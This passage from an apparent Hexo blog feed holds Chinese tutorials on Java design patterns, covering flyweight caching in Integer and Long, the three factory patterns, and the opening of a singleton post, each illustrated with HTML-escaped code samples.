   static final Integer cache[]; &#x2F;&#x2F;缓存数组</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        &#x2F;&#x2F; high value may be configured by property</span><br><span class="line">        int h &#x3D; 127;</span><br><span class="line">        &#x2F;&#x2F;这里可以在运行时设置虚拟机参数来确定h  :-Djava.lang.Integer.IntegerCache.high&#x3D;250</span><br><span class="line">        String integerCacheHighPropValue &#x3D;</span><br><span class="line">            sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;);</span><br><span class="line">        if (integerCacheHighPropValue !&#x3D; null) &#123;&#x2F;&#x2F;用户设置了</span><br><span class="line">            int i &#x3D; parseInt(integerCacheHighPropValue);</span><br><span class="line">            i &#x3D; Math.max(i, 127);&#x2F;&#x2F;虽然设置了但是还是不能小于127</span><br><span class="line">            &#x2F;&#x2F; 也不能超过最大值</span><br><span class="line">            h &#x3D; Math.min(i, Integer.MAX_VALUE - (-low) -1);</span><br><span class="line">        &#125;</span><br><span class="line">        high &#x3D; h;</span><br><span class="line"></span><br><span class="line">        cache &#x3D; new Integer[(high - low) + 1];</span><br><span class="line">        int j &#x3D; low;</span><br><span class="line">        &#x2F;&#x2F;循环将区间的数赋值给cache[]数组</span><br><span class="line">        for(int k &#x3D; 0; k &lt; cache.length; k++)</span><br><span class="line">            cache[k] &#x3D; new Integer(j++);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private IntegerCache() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到 Integer 默认先创建并缓存 -128 ~ 127 之间数的 Integer 对象，当调用 valueOf 时如果参数在 -128 ~ 127 之间则计算下标并从缓存中返回，否则创建一个新的 Integer 对象</p><p><strong>Long 中的享元模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public final class Long extends Number implements Comparable&lt;Long&gt; &#123;</span><br><span class="line">    public static Long valueOf(long var0) &#123;</span><br><span class="line">        return var0 &gt;&#x3D; -128L &amp;&amp; var0 &lt;&#x3D; 127L ? Long.LongCache.cache[(int)var0 + 128] : new Long(var0);</span><br><span class="line">    &#125;   </span><br><span class="line">    private static class LongCache &#123;</span><br><span class="line">        private LongCache()&#123;&#125;</span><br><span class="line"></span><br><span class="line">        static final Long cache[] &#x3D; new Long[-(-128) + 127 + 1];</span><br><span class="line"></span><br><span class="line">        static &#123;</span><br><span class="line">            for(int i &#x3D; 0; i &lt; cache.length; i++)</span><br><span class="line">                cache[i] &#x3D; new Long(i - 128);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同理，Long 中也有缓存，不过不能指定缓存最大值</p><p><strong>Apache Commons Pool2中的享元模式</strong><br>对象池化的基本思路是：将用过的对象保存起来，等下一次需要这种对象的时候，再拿出来重复使用，从而在一定程度上减少频繁创建对象所造成的开销。用于充当保存对象的“容器”的对象，被称为“对象池”（Object Pool，或简称Pool）<br>Apache Commons Pool实现了对象池的功能。定义了对象的生成、销毁、激活、钝化等操作及其状态转换，并提供几个默认的对象池实现。<br>有几个重要的对象：</p><ul><li>PooledObject（池对象）：用于封装对象（如：线程、数据库连接、TCP连接），将其包裹成可被池管理的对象。</li><li>PooledObjectFactory（池对象工厂）：定义了操作PooledObject实例生命周期的一些方法，PooledObjectFactory必须实现线程安全。</li><li>Object Pool （对象池）：Object Pool负责管理PooledObject，如：借出对象，返回对象，校验对象，有多少激活对象，有多少空闲对象。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 对象池</span><br><span class="line">private final Map&lt;S, PooledObject&lt;S&gt;&gt; allObjects &#x3D; new ConcurrentHashMap&lt;S, PooledObject&lt;S&gt;&gt;();</span><br><span class="line"></span><br></pre></td></tr></table></figure>重要方法：</li></ul><p>borrowObject：从池中借出一个对象。<br>returnObject：将一个对象返还给池。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工厂模式</title>
      <link href="/2021/02/14/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/02/14/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><p>工厂模式分为</p><ul><li>简单(静态)工厂</li><li>工厂方法</li><li>抽象工厂</li></ul><p>下面分别介绍这几总工厂模式</p><h4 id="简单工厂-静态工厂"><a href="#简单工厂-静态工厂" class="headerlink" title="简单工厂 (静态工厂)"></a>简单工厂 (静态工厂)</h4><p>简单工厂模式其实并不算是一种设计模式，更多的时候是一种编程习惯。<br><strong>定义</strong><br>定义一个工厂类，根据传入的参数不同返回不同的实例，被创建的实例具有共同的父类或接口。<br><strong>适用场景</strong><br>首先由于只有一个工厂类，所以工厂类中创建的对象不能太多，否则工厂类的业务逻辑就太复杂了，其次由于工厂类封装了对象的创建过程，所以客户端应该不关心对象的创建。总结一下适用场景：　　</p><ol><li>需要创建的对象较少。　　</li><li>客户端不关心对象的创建过程。</li></ol><p>以上就是简单工厂模式简单工厂模式的适用场景，下面看一个具体的实例。对于需要新增的类，我们就需要改变代码，这是简单工厂的一个不足之处。</p><p><strong>实例</strong><br>创建一个可以绘制不同形状的绘图工具，可以绘制圆形，正方形，三角形，每个图形都会有一个draw()方法用于绘图，不看代码先考虑一下如何通过该模式设计完成此功能。<br>圆形，正方形，三角形都属于一种图形，并且都具有draw方法，所以首先可以定义一个接口或者抽象类，作为这三个图像的公共父类，并在其中声明一个公共的draw方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Shape &#123;</span><br><span class="line">    void draw();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>圆形：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class CircleShape implements Shape &#123;</span><br><span class="line"></span><br><span class="line">    public CircleShape() &#123;</span><br><span class="line">        System.out.println(  &quot;CircleShape: created&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void draw() &#123;</span><br><span class="line">        System.out.println(  &quot;draw: CircleShape&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正方形：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class RectShape implements Shape &#123;</span><br><span class="line">    public RectShape() &#123;</span><br><span class="line">       System.out.println(  &quot;RectShape: created&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void draw() &#123;</span><br><span class="line">       System.out.println(  &quot;draw: RectShape&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三角形：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class TriangleShape implements Shape &#123;</span><br><span class="line"></span><br><span class="line">    public TriangleShape() &#123;</span><br><span class="line">        System.out.println(  &quot;TriangleShape: created&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void draw() &#123;</span><br><span class="line">        System.out.println(  &quot;draw: TriangleShape&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂类实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class ShapeFactory &#123;</span><br><span class="line">         public static final String TAG &#x3D; &quot;ShapeFactory&quot;;</span><br><span class="line">         public static Shape getShape(String type) &#123;</span><br><span class="line">             Shape shape &#x3D; null;</span><br><span class="line">             if (type.equalsIgnoreCase(&quot;circle&quot;)) &#123;</span><br><span class="line">                 shape &#x3D; new CircleShape();</span><br><span class="line">             &#125; else if (type.equalsIgnoreCase(&quot;rect&quot;)) &#123;</span><br><span class="line">                 shape &#x3D; new RectShape();</span><br><span class="line">             &#125; else if (type.equalsIgnoreCase(&quot;triangle&quot;)) &#123;</span><br><span class="line">                 shape &#x3D; new TriangleShape();</span><br><span class="line">             &#125;</span><br><span class="line">             return shape;</span><br><span class="line">         &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如何使用工厂类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;画圆形</span><br><span class="line">Shape shape&#x3D; ShapeFactory.getShape(&quot;circle&quot;);</span><br><span class="line">shape.draw();</span><br><span class="line">&#x2F;&#x2F;画方形</span><br><span class="line">Shape shape&#x3D; ShapeFactory.getShape(&quot;rect&quot;);</span><br><span class="line">shape.draw();</span><br><span class="line">&#x2F;&#x2F;画三角形</span><br><span class="line">Shape shape&#x3D; ShapeFactory.getShape(&quot;triangle&quot;);</span><br><span class="line">shape.draw();</span><br></pre></td></tr></table></figure><h4 id="工厂方法"><a href="#工厂方法" class="headerlink" title="工厂方法"></a>工厂方法</h4><p>工厂方法模式是简单工厂的仅一步深化， 在工厂方法模式中，我们不再提供一个统一的工厂类来创建所有的对象，而是针对不同的对象提供不同的工厂。也就是说每个对象都有一个与之对应的工厂。<br><strong>定义</strong>　　<br>定义一个用于创建对象的接口，让子类决定将哪一个类实例化。工厂方法模式让一个类的实例化延迟到其子类。　<br><strong>适用场景</strong></p><ul><li>客户端不需要知道它所创建的对象的类。例子中我们不知道每个宠物具体叫什么名，只知道创建它的工厂名就完成了创建过程。</li><li>客户端可以通过子类来指定创建对应的对象。</li></ul><p>以上场景使用于采用工厂方法模式。<br>比如在一家宠物店，里面有各种各样的宠物，构建宠物的工厂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 号称什么宠物都有</span><br><span class="line">public interface AnimalFactory &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可以获取任何的宠物</span><br><span class="line">Animal createAnimal();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主流的宠物，构建猫和狗的工厂(继承着所有宠物的工厂),<br>猫工厂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 继承着宠物工厂</span><br><span class="line">public class CatFactory implements AnimalFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    &#x2F;&#x2F; 创建猫</span><br><span class="line">    public Animal createAnimal() &#123;</span><br><span class="line">        return new Cat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>狗工厂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 继承着宠物工厂</span><br><span class="line">public class DogFactory implements AnimalFactory &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建狗</span><br><span class="line">@Override</span><br><span class="line">public Animal createAnimal() &#123;</span><br><span class="line">return new Dog();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>嗯，还有我们的实体类：猫、狗、动物(多态：猫和狗都是动物，可以直接用动物来表示了)</p><p>动物实体类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public abstract class Animal &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 所有的动物都会吃东西</span><br><span class="line">public abstract void eat();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猫实体类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Cat extends Animal &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 猫喜欢吃鱼</span><br><span class="line">@Override</span><br><span class="line">public void eat() &#123;</span><br><span class="line">System.out.println(&quot;猫吃鱼&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>狗实体类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Dog extends Animal &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 狗喜欢吃肉</span><br><span class="line">@Override</span><br><span class="line">public void eat() &#123;</span><br><span class="line">System.out.println(&quot;狗吃肉&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟宠物店老板说想要一只狗，宠物店老板就去找狗回来了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 去找狗工厂拿一只狗过来</span><br><span class="line">AnimalFactory f &#x3D; new DogFactory();</span><br><span class="line">Animal a &#x3D; f.createAnimal();</span><br><span class="line">a.eat();</span><br></pre></td></tr></table></figure><p>想要猫：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 去找猫工厂拿一只猫过来</span><br><span class="line">AnimalFactory ff &#x3D; new CatFactory();</span><br><span class="line">Animal aa &#x3D; ff.createAnimal();</span><br><span class="line">aa.eat();</span><br></pre></td></tr></table></figure><p>如果想要一只蜥蜴呢？那就需要创建蜥蜴类和蜥蜴工厂类了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 要买蜥蜴..</span><br><span class="line">AnimalFactory fff &#x3D; new LizardFactory();</span><br><span class="line">Animal aaa &#x3D; ff.createAnimal();</span><br><span class="line">aaa.eat();</span><br></pre></td></tr></table></figure><p>综上，工厂方法的优缺点</p><p><strong>优点:</strong></p><ul><li>客户端不需要在负责对象的创建,明确了各个类的职责</li><li>如果有新的对象增加,只需要增加一个具体的类和具体的工厂类即可</li><li>不会影响已有的代码,后期维护容易,增强系统的扩展性</li></ul><p><strong>缺点:</strong></p><ul><li>需要额外的编写代码,增加了工作量</li></ul><h4 id="抽象工厂"><a href="#抽象工厂" class="headerlink" title="抽象工厂"></a>抽象工厂</h4><p>这个模式最不好理解，而且在实际应用中局限性也蛮大的，因为这个模式并不符合开闭原则。实际开发还需要做好权衡。　　<br>抽象工厂模式是工厂方法的仅一步深化，在这个模式中的工厂类不单单可以创建一个对象，而是可以创建一组对象。这是和工厂方法最大的不同点。<br><strong>定义</strong>　　<br>提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。（ 在抽象工厂模式中，每一个具体工厂都提供了多个工厂方法用于产生多种不同类型的对象）　　</p><p>抽象工厂和工厂方法一样可以划分为4大部分：</p><ul><li>AbstractFactory（抽象工厂）声明了一组用于创建对象的方法，注意是一组。</li><li>ConcreteFactory（具体工厂）：它实现了在抽象工厂中声明的创建对象的方法，生成一组具体对象。                    </li><li>AbstractProduct（抽象产品）：它为每种对象声明接口，在其中声明了对象所具有的业务方法。</li><li>ConcreteProduct（具体产品）：它定义具体工厂生产的具体对象。下面还是先看一个具体实例。</li></ul><p>现在需要做一款跨平台的游戏，需要兼容Android，Ios，Wp三个移动操作系统，该游戏针对每个系统都设计了一套操作控制器（OperationController）和界面控制器（UIController），下面通过抽闲工厂方式完成这款游戏的架构设计。<br>由题可知，游戏里边的各个平台的UIController和OperationController应该是我们最终生产的具体产品。所以新建两个抽象产品接口。<br>操作控制器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface OperationController &#123;</span><br><span class="line">    void control();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>界面控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface UIController &#123;</span><br><span class="line">    void display();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后完成各个系统平台的具体操作控制器和界面控制器<br>Android:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class AndroidOperationController implements OperationController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void control() &#123;</span><br><span class="line">        System.out.println(&quot;AndroidOperationController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class AndroidUIController implements UIController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void display() &#123;</span><br><span class="line">        System.out.println(&quot;AndroidInterfaceController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IOS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class IosOperationController implements OperationController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void control() &#123;</span><br><span class="line">        System.out.println(&quot;IosOperationController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class IosUIController implements UIController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void display() &#123;</span><br><span class="line">        System.out.println(&quot;IosInterfaceController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Wp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class WpOperationController implements OperationController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void control() &#123;</span><br><span class="line">        System.out.println(&quot;WpOperationController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class WpUIController implements UIController &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void display() &#123;</span><br><span class="line">        System.out.println(&quot;WpInterfaceController&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面定义一个抽象工厂，该工厂需要可以创建OperationController和UIController</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public interface SystemFactory &#123;</span><br><span class="line">    public OperationController createOperationController();</span><br><span class="line">    public UIController createInterfaceController();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在各平台具体的工厂类中完成操作控制器和界面控制器的创建过程<br>Android:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class AndroidFactory implements SystemFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public OperationController createOperationController() &#123;</span><br><span class="line">        return new AndroidOperationController();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public UIController createInterfaceController() &#123;</span><br><span class="line">        return new AndroidUIController();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IOS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class IosFactory implements SystemFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public OperationController createOperationController() &#123;</span><br><span class="line">        return new IosOperationController();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public UIController createInterfaceController() &#123;</span><br><span class="line">        return new IosUIController();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Wp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class WpFactory implements SystemFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public OperationController createOperationController() &#123;</span><br><span class="line">        return new WpOperationController();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public UIController createInterfaceController() &#123;</span><br><span class="line">        return new WpUIController();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SystemFactory mFactory;</span><br><span class="line">UIController interfaceController;</span><br><span class="line">OperationController operationController;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Android</span><br><span class="line">mFactory&#x3D;new AndroidFactory();</span><br><span class="line">&#x2F;&#x2F;Ios</span><br><span class="line">mFactory&#x3D;new IosFactory();</span><br><span class="line">&#x2F;&#x2F;Wp</span><br><span class="line">mFactory&#x3D;new WpFactory();</span><br><span class="line"></span><br><span class="line">interfaceController&#x3D;mFactory.createInterfaceController();</span><br><span class="line">operationController&#x3D;mFactory.createOperationController();</span><br><span class="line">interfaceController.display();</span><br><span class="line">operationController.control();</span><br></pre></td></tr></table></figure><p>针对不同平台只通过创建不同的工厂对象就完成了操作和UI控制器的创建。小伙伴们可以对比一下，如果这个游戏使用工厂方法模式搭建需要创建多少个工厂类呢？下面总结一下抽象工厂的适用场景。</p><p><strong>适用场景</strong></p><ul><li>和工厂方法一样客户端不需要知道它所创建的对象的类。</li><li>需要一组对象共同完成某种功能时。并且可能存在多组对象完成不同功能的情况。</li><li>系统结构稳定，不会频繁的增加对象。（因为一旦增加就需要修改原有代码，不符合开闭原则）</li></ul><p>以上就是三种工厂模式的总结，如有不对之处还希望各位留言指正，以免误导他人。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://juejin.cn/post/6844903474639929357">工厂模式——看这一篇就够了</a></li><li><a href="https://zhuanlan.zhihu.com/p/37095996">工厂模式理解了没有</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/2021/02/14/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/02/14/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是单例模式"><a href="#什么是单例模式" class="headerlink" title="什么是单例模式"></a>什么是单例模式</h1><p>单例模式（Singleton），也叫单子模式，是一种常用的软件设计模式。在应用这个模式时，单例对象的类必须保证只有一个实例存在。许多时候整个系统只需要拥有一个的全局对象，这样有利于我们协调系统整体的行为。比如在一个app里面，有一个类管理用户设置的配置信息：比如是否收集log， 最多收集多少条log，退出是否需要清除app的缓存等。用一个类便于实现全局管理，这些配置信息可能在多个地方用到。 </p><h1 id="实现单例模式的思路"><a href="#实现单例模式的思路" class="headerlink" title="实现单例模式的思路"></a>实现单例模式的思路</h1><p>一个类能返回对象一个引用(永远是同一个)和一个获得该实例的方法（必须是静态方法，通常使用getInstance这个名 称）；当我们调用这个方法时，如果类持有的引用不为空就返回这个引用，如果类保持的引用为空就创建该类的实例并将实例的引用赋予该类保持的引用；同时我们 还将该类的构造函数定义为私有方法，这样其他处的代码就无法通过调用该类的构造函数来实例化该类的对象，只有通过该类提供的静态方法来得到该类的唯一实例。 </p><h1 id="单例模式的实现方法"><a href="#单例模式的实现方法" class="headerlink" title="单例模式的实现方法"></a>单例模式的实现方法</h1><p>实现单例模式的方法有很多，但我们要保证调用getInstance()方法只返回同一个实例，同时考虑多线程和效率。以SettingManager为例讲解实现的方法。</p><h4 id="1-饿汉模式"><a href="#1-饿汉模式" class="headerlink" title="1. 饿汉模式"></a>1. 饿汉模式</h4><p>饿汉模式的实现方法如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class  &#123;</span><br><span class="line">    private static final SettingManager INSTANCE &#x3D; new SettingManager();</span><br><span class="line"></span><br><span class="line">    private SettingManager() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    public static SettingManager getInstance() &#123;</span><br><span class="line">        return INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点：简单方便，不存在线程安全问题。推荐使用。<br>缺点：不管用到与否，类装载时就完成实例化。不用的时候会造成一定的资源浪费。</p><h4 id="2-双重锁懒汉模式"><a href="#2-双重锁懒汉模式" class="headerlink" title="2. 